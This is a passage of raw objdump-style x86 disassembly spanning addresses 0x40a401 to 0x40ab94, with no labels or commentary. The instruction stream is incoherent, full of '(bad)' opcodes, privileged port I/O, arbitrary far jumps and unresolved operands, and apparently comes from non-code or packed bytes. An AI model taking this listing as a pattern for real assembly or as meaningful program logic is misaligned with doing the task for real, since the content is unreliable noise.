  40a401:	adc    edx,esp
  40a403:	dec    edx
  40a404:	jmp    0x4ce1:0x5babef61
  40a40b:	adc    DWORD PTR [esi+0x19f3f583],esi
  40a411:	imul   ecx
  40a413:	sbb    DWORD PTR es:[ebx],ebx
  40a416:	xchg   DWORD PTR [ecx+0x1],esi
  40a419:	xor    ebx,ecx
  40a41b:	inc    edx
  40a41c:	mov    ebp,0x5fc09428
  40a421:	lods   al,BYTE PTR ds:[esi]
  40a422:	inc    esp
  40a423:	ins    DWORD PTR es:[edi],dx
  40a424:	loopne 0x40a436
  40a426:	push   DWORD PTR [edi]
  40a428:	xor    bl,BYTE PTR [esi]
  40a42a:	push   ebp
  40a42b:	loop   0x40a480
  40a42d:	inc    ebp
  40a42e:	xor    DWORD PTR [ebx+0x4bfd8b2c],0xb5c47292
  40a438:	adc    eax,0xa9a818a2
  40a43d:	(bad)  
  40a43e:	and    eax,0xb795d1b2
  40a443:	push   ebx
  40a444:	retf   0xb650
  40a447:	fldcw  WORD PTR [ebx+0x1c3baca2]
  40a44d:	aad    0x99
  40a44f:	ins    BYTE PTR es:[edi],dx
  40a450:	pop    ds
  40a451:	retf   0x61ee
  40a454:	xor    BYTE PTR [esi],ch
  40a456:	ja     0x40a3ff
  40a458:	in     eax,0x2d
  40a45a:	mov    cl,0x4f
  40a45c:	mov    ds:0x94a853dd,eax
  40a461:	mov    ebx,0xc9f0b19b
  40a466:	rol    edi,cl
  40a468:	test   al,0x68
  40a46a:	sbb    dh,bl
  40a46c:	leave  
  40a46d:	mov    ebx,0xedf65c0a
  40a472:	fucomip st,st(4)
  40a474:	mov    ds:0x8ab4d2b4,al
  40a479:	test   al,0x20
  40a47b:	cmp    BYTE PTR [ebx+0x577e1f04],cl
  40a481:	frstor [ebx]
  40a483:	stos   DWORD PTR es:[edi],eax
  40a484:	(bad)  
  40a485:	enter  0x378a,0x55
  40a489:	ins    BYTE PTR es:[edi],dx
  40a48a:	xchg   ebp,ecx
  40a48c:	std    
  40a48d:	push   0x4e22e60d
  40a492:	scas   al,BYTE PTR es:[edi]
  40a493:	scas   al,BYTE PTR es:[edi]
  40a494:	adc    eax,0x86224e8b
  40a499:	push   es
  40a49a:	jae    0x40a489
  40a49c:	mov    cl,0xe4
  40a49e:	(bad)  
  40a49f:	xor    DWORD PTR [ebx],ecx
  40a4a1:	cmp    DWORD PTR [eax+ecx*4-0x6860208],esi
  40a4a8:	sar    dl,1
  40a4aa:	pop    ebp
  40a4ab:	sbb    al,0xf1
  40a4ad:	clc    
  40a4ae:	addr16 dec eax
  40a4b1:	test   eax,0x75a7064e
  40a4b6:	mov    esi,0xe1dd31f7
  40a4bb:	rcr    DWORD PTR [edx-0x17],0xe0
  40a4bf:	lods   eax,DWORD PTR ds:[esi]
  40a4c0:	addps  xmm3,XMMWORD PTR [ecx-0x2d]
  40a4c4:	mov    esi,0x1407d51c
  40a4c9:	sbb    eax,0x5a2bf08b
  40a4ce:	cmp    al,0xeb
  40a4d0:	test   BYTE PTR [edx-0x8],dh
  40a4d3:	lahf   
  40a4d4:	data16 stos BYTE PTR es:[edi],al
  40a4d6:	pushf  
  40a4d7:	pop    ds
  40a4d8:	test   eax,0x97dfcda0
  40a4dd:	(bad)  
  40a4de:	fwait
  40a4df:	retf   0xaee6
  40a4e2:	rcl    BYTE PTR [edx-0x79ffca34],0x2e
  40a4e9:	fist   WORD PTR [ebx+ebx*1-0x5c]
  40a4ed:	addr16 daa 
  40a4ef:	fisub  DWORD PTR [ebx-0x21cbd2fb]
  40a4f5:	retf   0xe762
  40a4f8:	xor    eax,0x410233d5
  40a4fd:	mov    esp,0xd742abad
  40a502:	sbb    cl,bl
  40a504:	(bad)  
  40a505:	or     eax,0xdcbd8783
  40a50a:	cmp    DWORD PTR [eax+edi*1-0x183687eb],0xffffffcb
  40a512:	lods   al,BYTE PTR ds:[esi]
  40a513:	fadd   DWORD PTR [ebp+0x41ef1704]
  40a519:	dec    esp
  40a51a:	enter  0x748,0xdc
  40a51e:	jecxz  0x40a4f4
  40a520:	dec    esi
  40a521:	and    cl,BYTE PTR [esp+eax*4]
  40a524:	mov    ebp,ecx
  40a526:	xor    eax,0xc99c1ced
  40a52b:	or     eax,DWORD PTR [edx-0x51]
  40a52e:	int    0x5d
  40a530:	iret   
  40a531:	leave  
  40a532:	(bad)  
  40a533:	xlat   BYTE PTR ds:[ebx]
  40a534:	jg     0x40a4c4
  40a536:	xor    eax,0xd2cbd8d0
  40a53b:	data16 adc dh,BYTE PTR [edx-0x2c]
  40a53f:	jno    0x40a590
  40a541:	sub    DWORD PTR [ecx+0x59],ebp
  40a544:	lods   al,BYTE PTR ds:[esi]
  40a545:	sar    BYTE PTR [edx],cl
  40a547:	push   ebx
  40a548:	pop    es
  40a549:	and    esp,ebx
  40a54b:	push   esp
  40a54c:	sti    
  40a54d:	jmp    0x40a5ae
  40a54f:	in     al,0x97
  40a551:	or     BYTE PTR [eax],0x50
  40a554:	clc    
  40a555:	dec    ecx
  40a556:	mov    eax,ds:0x5fddcb10
  40a55b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a55c:	test   BYTE PTR [ecx+eiz*4-0xd],bh
  40a560:	jmp    0x40a5ad
  40a562:	xchg   esi,eax
  40a563:	add    bh,BYTE PTR [eax-0x3d]
  40a566:	sub    dl,BYTE PTR [eax+0x37]
  40a569:	mov    esi,DWORD PTR [eax]
  40a56b:	cli    
  40a56c:	test   BYTE PTR [ebx+0x2d],ch
  40a56f:	jnp    0x40a547
  40a571:	dec    edx
  40a572:	aaa    
  40a573:	lock das 
  40a575:	xchg   edx,eax
  40a576:	pushf  
  40a577:	add    BYTE PTR ds:0xd038affb,al
  40a57d:	cli    
  40a57e:	test   ch,0xfb
  40a581:	cwde   
  40a582:	jp     0x40a59e
  40a584:	mov    ebx,0x42b4070
  40a589:	add    ah,ah
  40a58b:	mov    gs,WORD PTR [eax+edx*8+0x3981fe8f]
  40a592:	fsubr  st(1),st
  40a594:	mov    cl,0x94
  40a596:	jl     0x40a559
  40a598:	or     ch,BYTE PTR [ebx-0x55]
  40a59b:	inc    edx
  40a59c:	and    DWORD PTR [eax],eax
  40a59e:	fild   QWORD PTR es:[ecx-0x4e]
  40a5a2:	inc    ecx
  40a5a3:	jbe    0x40a5ac
  40a5a5:	jecxz  0x40a617
  40a5a7:	in     eax,0x35
  40a5a9:	int3   
  40a5aa:	jns    0x40a570
  40a5ac:	cmp    BYTE PTR [edx+0x2f],0x73
  40a5b0:	jle    0x40a56c
  40a5b2:	imul   DWORD PTR ds:0x3977c029
  40a5b8:	mov    ds:0x93bddf47,al
  40a5bd:	in     al,0xe8
  40a5bf:	add    DWORD PTR [ebx+0x70cc9056],0xe5b0ed34
  40a5c9:	test   BYTE PTR [eax+0x56],ch
  40a5cc:	mov    al,ds:0x364a7c80
  40a5d1:	pop    edx
  40a5d2:	div    BYTE PTR [edi-0x6b]
  40a5d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5d6:	leave  
  40a5d7:	push   es
  40a5d8:	inc    ebx
  40a5d9:	xlat   BYTE PTR ds:[ebx]
  40a5da:	mov    edi,0x9bc71cf5
  40a5df:	jecxz  0x40a659
  40a5e1:	push   es
  40a5e2:	pop    ebx
  40a5e3:	xor    DWORD PTR [ebp+0x7efe8fab],edi
  40a5e9:	fidiv  WORD PTR ss:[ecx+0x58c79eca]
  40a5f0:	pop    eax
  40a5f1:	rcr    al,1
  40a5f3:	nop
  40a5f4:	mov    WORD PTR [esi+0x41],?
  40a5f7:	stos   DWORD PTR es:[edi],eax
  40a5f8:	dec    eax
  40a5f9:	adc    DWORD PTR [edi],0xfffffffc
  40a5fc:	sbb    eax,0xab70793b
  40a601:	fcomp  DWORD PTR [ecx]
  40a603:	mov    esp,0xfc4a6c53
  40a608:	daa    
  40a609:	mov    ss,WORD PTR [edi]
  40a60b:	mov    cl,0x6b
  40a60d:	shr    DWORD PTR [edi],1
  40a60f:	mov    edi,0x4feb32c2
  40a614:	sub    BYTE PTR [ecx-0x63],0xb4
  40a618:	(bad)  
  40a619:	leave  
  40a61a:	(bad)  
  40a61d:	icebp  
  40a61e:	icebp  
  40a61f:	xchg   ecx,eax
  40a620:	gs jp  0x40a638
  40a623:	call   0x70c18d57
  40a628:	retf   
  40a629:	inc    esp
  40a62a:	fisttp QWORD PTR [ebx]
  40a62c:	push   0x52
  40a62e:	sbb    DWORD PTR [ebp-0x7d],edi
  40a631:	or     al,0xe0
  40a633:	and    al,0x42
  40a635:	push   esp
  40a636:	pop    dx
  40a638:	cmp    DWORD PTR [ebp+0x76],eax
  40a63b:	pop    eax
  40a63c:	popf   
  40a63d:	or     ch,BYTE PTR [esi+0x22da3a8c]
  40a643:	and    BYTE PTR [eax+0x3a32e02f],ah
  40a649:	xchg   esp,eax
  40a64a:	jecxz  0x40a63e
  40a64c:	into   
  40a64d:	cmp    al,0x87
  40a64f:	cli    
  40a650:	mov    ebx,ebp
  40a652:	scas   eax,DWORD PTR es:[edi]
  40a653:	dec    edi
  40a654:	aaa    
  40a655:	mov    WORD PTR [esi+0xe89cc69],gs
  40a65b:	mov    al,0x8b
  40a65d:	mov    ds:0x523789ef,al
  40a662:	jae    0x40a60d
  40a664:	jmp    0x40a6e3
  40a666:	shl    eax,0x2c
  40a669:	enter  0x974f,0x78
  40a66d:	pushf  
  40a66e:	or     DWORD PTR [ebx-0x23],edi
  40a671:	sti    
  40a672:	ret    0xef77
  40a675:	pop    ecx
  40a676:	icebp  
  40a677:	xor    esp,DWORD PTR [ebx+0x21]
  40a67a:	es in  al,dx
  40a67c:	xchg   edx,eax
  40a67d:	push   cs
  40a67e:	push   0xffffffa3
  40a680:	push   edi
  40a681:	sti    
  40a682:	test   al,0x8
  40a684:	out    dx,eax
  40a685:	cmp    eax,0xca299d75
  40a68a:	cmp    DWORD PTR [edi-0x4504cd8b],esi
  40a690:	inc    esi
  40a691:	mov    dh,0x86
  40a693:	or     al,0x34
  40a695:	out    0x5b,al
  40a697:	push   esp
  40a698:	jne    0x40a6e0
  40a69a:	nop
  40a69b:	mov    esp,DWORD PTR [edx]
  40a69d:	adc    BYTE PTR [edi+0x17],dh
  40a6a0:	or     DWORD PTR [eax+0x72],esi
  40a6a3:	lods   al,BYTE PTR ds:[esi]
  40a6a4:	in     al,0x6e
  40a6a6:	xchg   edi,eax
  40a6a7:	or     eax,0xc513e832
  40a6ac:	in     eax,0xd
  40a6ae:	mov    ecx,0xd82d9fb0
  40a6b3:	pop    esp
  40a6b4:	xchg   esp,eax
  40a6b5:	leave  
  40a6b6:	mov    eax,ds:0x5ed95570
  40a6bb:	xor    al,0x9d
  40a6bd:	push   ecx
  40a6be:	mov    cs,WORD PTR [ebp-0x1f2313eb]
  40a6c4:	and    BYTE PTR [ebx],0x87
  40a6c7:	dec    ecx
  40a6c8:	sti    
  40a6c9:	inc    esi
  40a6ca:	mov    ecx,0xf16ae197
  40a6cf:	add    ecx,DWORD PTR [esp+eax*1-0x60b5d14a]
  40a6d6:	stos   BYTE PTR es:[edi],al
  40a6d7:	mov    esp,0x98a6ec7e
  40a6dc:	call   0x34a9a10d
  40a6e1:	fwait
  40a6e2:	push   eax
  40a6e3:	pop    ss
  40a6e4:	hlt    
  40a6e5:	mov    ?,WORD PTR [edi+0x4e815734]
  40a6eb:	(bad)  
  40a6ec:	nop
  40a6ed:	jge    0x40a679
  40a6ef:	mov    ch,0xe4
  40a6f1:	not    BYTE PTR [edi]
  40a6f3:	(bad)  
  40a6f4:	cmp    edi,DWORD PTR ds:0x94300dc
  40a6fa:	xlat   BYTE PTR ds:[ebx]
  40a6fb:	jp     0x40a726
  40a6fd:	mov    dl,0xab
  40a6ff:	mov    dl,0xdd
  40a701:	ja     0x40a75c
  40a703:	xchg   edx,eax
  40a704:	sub    dl,dh
  40a706:	bnd jmp 0x40a6a0
  40a709:	sub    edi,DWORD PTR [eax]
  40a70b:	and    edi,DWORD PTR [ebp+ebp*4-0x1f161c3b]
  40a712:	jmp    0x9493:0x2a2027a6
  40a719:	sbb    al,0xdd
  40a71b:	inc    esi
  40a71c:	les    ecx,FWORD PTR [edi+0x24]
  40a71f:	mov    WORD PTR [edx+0x6c],ss
  40a722:	or     al,0xc6
  40a724:	pop    eax
  40a725:	std    
  40a726:	aad    0x27
  40a728:	inc    ebp
  40a729:	imul   esi,DWORD PTR [ecx+0x3146697b],0xffffff99
  40a730:	cwde   
  40a731:	fisub  WORD PTR [esi+0x4057a09]
  40a737:	imul   ebp,DWORD PTR [esi+0x28f03832],0x49
  40a73e:	lahf   
  40a73f:	enter  0x252,0xb2
  40a743:	aam    0x18
  40a745:	sbb    cl,BYTE PTR [edx-0x5b]
  40a748:	push   esi
  40a749:	shl    BYTE PTR [ebx+0x1f],0xde
  40a74d:	pop    ebp
  40a74e:	sbb    esp,eax
  40a750:	dec    ecx
  40a751:	push   esi
  40a752:	pop    esp
  40a753:	lods   eax,DWORD PTR ds:[esi]
  40a754:	pop    ebp
  40a755:	not    DWORD PTR [ebp-0x6c5e8c00]
  40a75b:	xchg   ecx,eax
  40a75c:	popa   
  40a75d:	jg     0x40a778
  40a75f:	inc    ecx
  40a760:	(bad)  
  40a761:	clc    
  40a762:	jmp    0x7b76:0x63f0ab48
  40a769:	inc    esi
  40a76a:	xor    BYTE PTR [esi+ecx*2],al
  40a76d:	inc    ebp
  40a76e:	pop    edi
  40a76f:	scas   eax,DWORD PTR es:[edi]
  40a770:	enter  0x4a7e,0x61
  40a774:	jle    0x40a7d7
  40a776:	pop    ebx
  40a777:	pop    es
  40a778:	xor    bl,BYTE PTR [ecx+0x1e]
  40a77b:	pushf  
  40a77c:	bound  ecx,QWORD PTR [ebx+eiz*1-0x5331af71]
  40a783:	mov    cs,edx
  40a785:	je     0x40a7df
  40a787:	adc    al,0x31
  40a789:	(bad)  
  40a78a:	sub    eax,0x4b7ec632
  40a78f:	xchg   esp,eax
  40a790:	sbb    eax,edx
  40a792:	lock ins BYTE PTR es:[edi],dx
  40a794:	cmp    eax,0xaeba625d
  40a799:	xchg   esp,eax
  40a79a:	leave  
  40a79b:	ret    0x174
  40a79e:	(bad)  
  40a79f:	arpl   WORD PTR [ebx+0x8],bp
  40a7a2:	dec    edx
  40a7a3:	or     al,BYTE PTR [edi+edi*1+0x43]
  40a7a7:	bnd jl 0x40a76d
  40a7aa:	sbb    edx,DWORD PTR [esi+esi*1-0x32772874]
  40a7b1:	int    0x3e
  40a7b3:	sub    DWORD PTR [ebp+0x15],edx
  40a7b6:	test   eax,0x75f67f03
  40a7bb:	loope  0x40a750
  40a7bd:	enter  0x765,0xe0
  40a7c1:	mov    ah,0xf8
  40a7c3:	das    
  40a7c4:	lock xchg ecx,ebp
  40a7c7:	loop   0x40a805
  40a7c9:	adc    al,0xbb
  40a7cb:	or     al,0xa3
  40a7cd:	sbb    dl,BYTE PTR [edx+0x1cea937]
  40a7d3:	mov    WORD PTR [edx-0x3311a5d6],fs
  40a7d9:	dec    esi
  40a7da:	sar    BYTE PTR [esi],cl
  40a7dc:	adc    al,0xb4
  40a7de:	(bad)  
  40a7df:	fsub   QWORD PTR [edi+0x6b]
  40a7e2:	dec    ebx
  40a7e3:	stc    
  40a7e4:	nop
  40a7e5:	in     eax,0x79
  40a7e7:	fmul   DWORD PTR [ebx+0x28]
  40a7ea:	ret    
  40a7eb:	and    al,0x33
  40a7ed:	hlt    
  40a7ee:	pop    ebx
  40a7ef:	lock test dh,cl
  40a7f2:	cld    
  40a7f3:	and    esi,DWORD PTR [edi-0x65cb8fa0]
  40a7f9:	mov    al,0x11
  40a7fb:	dec    esi
  40a7fc:	fistp  DWORD PTR [ebx+0x2b8ab129]
  40a802:	aas    
  40a803:	sub    eax,0xb692ef5
  40a808:	fs enter 0x7764,0xe4
  40a80d:	pop    ss
  40a80e:	repz mov ch,0xe5
  40a811:	jecxz  0x40a868
  40a813:	mov    esi,0x3bdf015a
  40a818:	xlat   BYTE PTR ds:[ebx]
  40a819:	leave  
  40a81a:	mov    ah,dh
  40a81c:	out    dx,al
  40a81d:	in     eax,dx
  40a81e:	fnstsw WORD PTR [eax]
  40a820:	mov    ch,0x18
  40a822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a823:	pop    es
  40a824:	push   eax
  40a825:	jg     0x40a852
  40a827:	ret    
  40a828:	pop    es
  40a829:	pushf  
  40a82a:	push   ecx
  40a82b:	inc    ebp
  40a82c:	mov    ds:0x76edb711,eax
  40a831:	add    dh,bl
  40a833:	popf   
  40a834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a835:	xchg   ebx,eax
  40a836:	jno    0x40a835
  40a838:	inc    ebx
  40a839:	mov    bl,bh
  40a83b:	xchg   edx,eax
  40a83c:	in     al,0x59
  40a83e:	ret    
  40a83f:	inc    esp
  40a840:	jle    0x40a84c
  40a842:	dec    ebx
  40a843:	in     eax,0x20
  40a845:	out    dx,al
  40a846:	or     BYTE PTR [edi],bh
  40a848:	sub    BYTE PTR [edi+0x39807443],dh
  40a84e:	retf   
  40a84f:	leave  
  40a850:	push   ebp
  40a851:	fstp   QWORD PTR [ebx]
  40a853:	cld    
  40a854:	xor    eax,0xd5fc321f
  40a859:	test   DWORD PTR [eax-0x4f31efb9],ebp
  40a85f:	stc    
  40a860:	pop    eax
  40a861:	mov    cl,0xae
  40a863:	add    eax,0xf108d58b
  40a868:	xor    al,0x29
  40a86a:	adc    dl,BYTE PTR [ecx+0x7f]
  40a86d:	and    al,0x76
  40a86f:	add    eax,0x3736aa26
  40a874:	xor    eax,0xc0019c30
  40a879:	(bad)
  40a87c:	imul   ebp,DWORD PTR [ebp-0x43],0xf4e11a15
  40a883:	in     al,0x95
  40a885:	mov    edi,0x89e41506
  40a88a:	sub    edi,0x43ef1f86
  40a890:	fnstsw WORD PTR [ebx]
  40a892:	cld    
  40a893:	mov    al,ds:0x5b28e2f5
  40a898:	adc    DWORD PTR [eax],edi
  40a89a:	cmp    BYTE PTR [ebx],al
  40a89c:	mov    DWORD PTR [ebx-0x8],ecx
  40a89f:	retf   0x54c5
  40a8a2:	push   eax
  40a8a3:	jle    0x40a850
  40a8a5:	fwait
  40a8a6:	push   es
  40a8a7:	ja     0x40a8e1
  40a8a9:	jo     0x40a8ea
  40a8ab:	and    BYTE PTR [esi+0x4062cc4d],0x9f
  40a8b2:	dec    ecx
  40a8b3:	ds cs dec edx
  40a8b6:	ret    0xb45
  40a8b9:	mov    ds:0x9b081d75,eax
  40a8be:	scas   eax,DWORD PTR es:[edi]
  40a8bf:	cmc    
  40a8c0:	and    BYTE PTR [eax-0x4f67256a],bl
  40a8c6:	loop   0x40a859
  40a8c8:	out    dx,al
  40a8c9:	push   ecx
  40a8ca:	(bad)  
  40a8cb:	div    BYTE PTR [eax]
  40a8cd:	mov    ecx,0x335bd971
  40a8d2:	sbb    eax,0x748f058e
  40a8d7:	bnd jae 0x40a8c0
  40a8da:	sbb    dh,ah
  40a8dc:	inc    esi
  40a8dd:	(bad)  
  40a8de:	in     al,0xb8
  40a8e0:	mov    ds:0x6b9ee4b9,eax
  40a8e5:	or     ecx,DWORD PTR [edx]
  40a8e7:	call   0x2bf:0x36320862
  40a8ee:	(bad)
  40a8f1:	(bad)  
  40a8f3:	std    
  40a8f4:	(bad)  
  40a8f5:	dec    esp
  40a8f6:	mov    bl,0xcc
  40a8f8:	adc    bl,BYTE PTR [ecx-0x25c77cae]
  40a8fe:	pop    esi
  40a8ff:	lds    esi,FWORD PTR [ebx]
  40a901:	enter  0x5286,0xbf
  40a905:	jnp    0x40a96d
  40a907:	sbb    al,0x13
  40a909:	and    bl,ah
  40a90b:	adc    BYTE PTR [ecx],ch
  40a90d:	xchg   esi,eax
  40a90e:	adc    eax,0xab7704a2
  40a913:	mov    ds:0x85e0cd2f,al
  40a918:	dec    esp
  40a919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a91a:	int3   
  40a91b:	scas   al,BYTE PTR es:[edi]
  40a91c:	sub    BYTE PTR [ecx+0x54540677],ah
  40a922:	rcl    ecx,cl
  40a924:	or     eax,0x1b0c76ad
  40a929:	adc    eax,0xf6441533
  40a92e:	sahf   
  40a92f:	sbb    dl,BYTE PTR [ebp+0x42]
  40a932:	pop    eax
  40a933:	and    al,0x73
  40a935:	pop    ecx
  40a936:	call   0x3ce07fcf
  40a93b:	jge    0x40a8cb
  40a93d:	mov    bl,0x53
  40a93f:	gs pushf 
  40a941:	pop    edi
  40a942:	push   es
  40a943:	pop    eax
  40a944:	outs   dx,BYTE PTR ds:[esi]
  40a945:	push   edi
  40a946:	cmp    ebx,ebp
  40a948:	cld    
  40a949:	(bad)  
  40a94b:	mov    dl,0x36
  40a94d:	adc    al,0x76
  40a94f:	and    al,0x83
  40a951:	xchg   esi,eax
  40a952:	dec    eax
  40a953:	aaa    
  40a954:	mov    esp,0x656e6bdf
  40a959:	aam    0x3f
  40a95b:	rcl    BYTE PTR [eax-0x5ee4035],0x59
  40a962:	stos   DWORD PTR es:[edi],eax
  40a963:	fsubr  DWORD PTR [ebx+0x6d]
  40a966:	push   0xffffffa0
  40a968:	mov    ah,0xcb
  40a96a:	not    BYTE PTR [edx-0x1f9348ad]
  40a970:	shr    DWORD PTR [ebp-0x4c],0xbb
  40a974:	mov    esi,0x8ee265b3
  40a979:	scas   eax,DWORD PTR es:[edi]
  40a97a:	loop   0x40a946
  40a97c:	push   ss
  40a97d:	pop    ecx
  40a97e:	cmp    eax,0xfc03b1e9
  40a983:	fdivr  QWORD PTR [esi-0x58]
  40a986:	in     al,dx
  40a987:	adc    al,ah
  40a989:	mov    edi,0x4c8c678d
  40a98e:	push   cs
  40a98f:	scas   al,BYTE PTR es:[edi]
  40a990:	pop    ebp
  40a991:	mov    WORD PTR [ebx+0x525d0b50],fs
  40a997:	sahf   
  40a998:	pushf  
  40a999:	shr    BYTE PTR [ecx+0x6311acd9],cl
  40a99f:	mov    ebx,0xbcc7241c
  40a9a4:	jp     0x40a98f
  40a9a6:	ret    
  40a9a7:	jmp    0x9ae604b8
  40a9ac:	ins    DWORD PTR es:[edi],dx
  40a9ad:	cld    
  40a9ae:	mov    edx,0xc67143ab
  40a9b3:	ffree  st(3)
  40a9b5:	mov    dh,0x4b
  40a9b7:	mov    ebx,0x33b23ae7
  40a9bc:	and    ch,al
  40a9be:	push   edi
  40a9bf:	cmc    
  40a9c0:	stc    
  40a9c1:	out    dx,eax
  40a9c2:	jp     0x40aa02
  40a9c4:	sbb    edi,DWORD PTR [eax-0x52]
  40a9c7:	outs   dx,BYTE PTR ds:[esi]
  40a9c8:	mov    esp,0xcd656257
  40a9cd:	lock dec edi
  40a9cf:	fidiv  WORD PTR [edx+0x31467205]
  40a9d5:	aad    0x1d
  40a9d7:	sub    eax,0x943d27b4
  40a9dc:	xchg   ebx,eax
  40a9dd:	mov    eax,0x2142d00f
  40a9e2:	sub    BYTE PTR [edi+0x121f1f2a],al
  40a9e8:	mov    edx,0xf4f525f2
  40a9ed:	or     eax,0xe31da038
  40a9f2:	into   
  40a9f3:	scas   eax,DWORD PTR es:[edi]
  40a9f4:	sub    al,0xce
  40a9f6:	or     DWORD PTR [ebx-0x75d6b394],esi
  40a9fc:	or     esp,DWORD PTR [ebp+0x467f7132]
  40aa02:	test   DWORD PTR [eax],esp
  40aa04:	and    BYTE PTR [ebx-0x73],0xab
  40aa08:	jecxz  0x40a9ca
  40aa0a:	addr16 xchg esp,eax
  40aa0c:	push   ebp
  40aa0d:	jne    0x40a99d
  40aa0f:	mov    ebx,0x93e3cb8a
  40aa14:	add    BYTE PTR [edi],0xdc
  40aa17:	aad    0xb
  40aa19:	mov    eax,edx
  40aa1b:	or     DWORD PTR cs:[eax+0x125c7686],0x36689f6a
  40aa26:	mul    BYTE PTR [ebp+0x1951910e]
  40aa2c:	mov    eax,ds:0xf5e53714
  40aa31:	mov    ds:0x4e97b6ca,eax
  40aa36:	fwait
  40aa37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa38:	jecxz  0x40aa04
  40aa3a:	pushf  
  40aa3b:	jp     0x40aa82
  40aa3d:	push   esp
  40aa3e:	gs mov dh,0xab
  40aa41:	jmp    0x292b:0xf5cb7d7
  40aa48:	xchg   ecx,eax
  40aa49:	fs mov ebx,0x44378011
  40aa4f:	ret    0x125d
  40aa52:	and    eax,0xa281aa61
  40aa57:	xchg   esi,eax
  40aa58:	sub    DWORD PTR ds:0xa0f9919,0x7896e822
  40aa62:	mov    edi,DWORD PTR [esi]
  40aa64:	test   DWORD PTR [ecx+0x18371dde],ebx
  40aa6a:	sbb    bh,dl
  40aa6c:	fimul  DWORD PTR [esi-0x80]
  40aa6f:	js     0x40aa73
  40aa71:	pop    ebp
  40aa72:	push   edi
  40aa73:	jge    0x40aab3
  40aa75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa76:	pop    ds
  40aa77:	mov    dh,0x7a
  40aa79:	out    0x9d,al
  40aa7b:	cmp    DWORD PTR [esi+0x4d],ebx
  40aa7e:	movups xmm6,XMMWORD PTR [ecx+0x7c]
  40aa82:	gs pop edi
  40aa84:	addr16 loopne 0x40aa84
  40aa87:	shr    BYTE PTR [ebx-0x205eef5e],cl
  40aa8d:	shr    bh,0xbc
  40aa90:	or     DWORD PTR [edi+0x15aa133d],0xffffff86
  40aa97:	push   ebx
  40aa98:	into   
  40aa99:	jne    0x40aafa
  40aa9b:	(bad)  
  40aa9c:	xchg   ecx,eax
  40aa9d:	mov    al,bh
  40aa9f:	sahf   
  40aaa0:	enter  0xd408,0x6c
  40aaa4:	sbb    eax,0xd2c2fa94
  40aaa9:	sub    BYTE PTR [edi],bh
  40aaab:	ja     0x40aa9a
  40aaad:	push   cs
  40aaae:	mov    eax,ds:0xac6bae8d
  40aab3:	xor    ah,dh
  40aab5:	sub    eax,0x4f1c5b31
  40aaba:	xor    DWORD PTR [ebx+0x50ab82c7],esi
  40aac0:	jl     0x40aa47
  40aac2:	xchg   edx,eax
  40aac3:	jae    0x40aac5
  40aac5:	sbb    dl,BYTE PTR [esi]
  40aac7:	in     eax,dx
  40aac8:	push   0x51
  40aaca:	std    
  40aacb:	sbb    esp,esi
  40aacd:	mov    ds:0xaf6a1aad,eax
  40aad2:	sbb    al,0xe5
  40aad4:	lahf   
  40aad5:	xlat   BYTE PTR ds:[ebx]
  40aad6:	stos   BYTE PTR es:[edi],al
  40aad7:	cmc    
  40aad8:	add    al,0xa1
  40aada:	out    0x5c,al
  40aadc:	out    dx,eax
  40aadd:	mov    al,ds:0xbc2f45a8
  40aae2:	jbe    0x40aa9e
  40aae4:	mov    ?,edx
  40aae6:	fdivr  QWORD PTR [ebp+0x392db1d9]
  40aaec:	das    
  40aaed:	inc    ecx
  40aaee:	push   esp
  40aaef:	daa    
  40aaf0:	pop    ss
  40aaf1:	sbb    ch,BYTE PTR ds:0xd1b47238
  40aaf7:	fiadd  DWORD PTR [eax]
  40aaf9:	or     eax,0xc85a5198
  40aafe:	pop    ebx
  40aaff:	mov    al,0x4b
  40ab01:	inc    edx
  40ab02:	fcom   QWORD PTR [esi+0x33]
  40ab05:	enter  0x5f2b,0x5b
  40ab09:	inc    ebp
  40ab0a:	sub    DWORD PTR [edx],esp
  40ab0c:	rcl    BYTE PTR [ecx],1
  40ab0e:	out    dx,eax
  40ab0f:	ss cmc 
  40ab11:	add    DWORD PTR ds:[edx],0x4
  40ab15:	scas   eax,DWORD PTR es:[edi]
  40ab16:	or     BYTE PTR [ecx-0x4a],bh
  40ab19:	jl     0x40ab62
  40ab1b:	jne    0x40aae8
  40ab1d:	jl     0x40aafa
  40ab1f:	xor    cl,BYTE PTR ds:0x6cadcbe
  40ab25:	push   ebx
  40ab26:	jnp    0x40aaed
  40ab28:	(bad)  
  40ab29:	pop    edx
  40ab2a:	fstp   QWORD PTR [edi+0x208f50ce]
  40ab30:	inc    esi
  40ab31:	sbb    bl,BYTE PTR [esi+0xaafeb2a]
  40ab37:	dec    ecx
  40ab38:	sbb    al,0x2f
  40ab3a:	mov    al,ds:0x7a777e2c
  40ab3f:	sbb    BYTE PTR [edi+ecx*4],al
  40ab42:	cwde   
  40ab43:	inc    edi
  40ab44:	test   al,0xfb
  40ab46:	ss xchg edx,eax
  40ab48:	scas   eax,DWORD PTR es:[edi]
  40ab49:	fimul  DWORD PTR [edi]
  40ab4b:	out    0x43,eax
  40ab4d:	into   
  40ab4e:	inc    ecx
  40ab4f:	mov    dh,0x7a
  40ab51:	js     0x40ab46
  40ab53:	cmp    al,0x62
  40ab55:	mov    dh,0xeb
  40ab57:	and    ebp,eax
  40ab59:	ret    
  40ab5a:	clc    
  40ab5b:	xchg   esp,eax
  40ab5c:	sbb    dh,BYTE PTR [eax]
  40ab5e:	add    BYTE PTR ds:0xba5f234a,bh
  40ab64:	mov    es,WORD PTR [eax]
  40ab66:	and    ebx,DWORD PTR [ebx+0x3fa790b4]
  40ab6c:	jno    0x40ab6c
  40ab6e:	imul   ebp,DWORD PTR [edx+0x74],0xfffffff9
  40ab72:	daa    
  40ab73:	mov    ah,0x63
  40ab75:	cdq    
  40ab76:	imul   eax,ebx,0x3bf7b4c4
  40ab7c:	inc    ebp
  40ab7d:	push   es
  40ab7e:	aad    0xdf
  40ab80:	bound  ecx,QWORD PTR [edi]
  40ab82:	mov    ecx,ds
  40ab84:	in     al,0x68
  40ab86:	pop    ebp
  40ab87:	cmc    
  40ab88:	push   0x9
  40ab8a:	mov    BYTE PTR [eax],al
  40ab8c:	cdq    
  40ab8d:	jmp    0xdfc82952
  40ab92:	mov    ch,0x75
  40ab94:	mov    fs,WORD PTR [esi-0x29]
